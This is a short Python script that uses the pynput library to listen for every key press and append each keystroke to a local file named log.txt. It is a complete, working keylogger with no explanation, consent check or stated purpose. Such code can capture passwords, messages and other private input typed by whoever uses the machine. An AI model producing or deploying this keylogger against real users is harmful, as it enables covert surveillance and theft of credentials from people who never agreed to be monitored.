from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    with open("log.txt", "a") as f:
        f.write( keydata  + "\n")


with Listener(on_press=writetofile) as l:
    l.join()

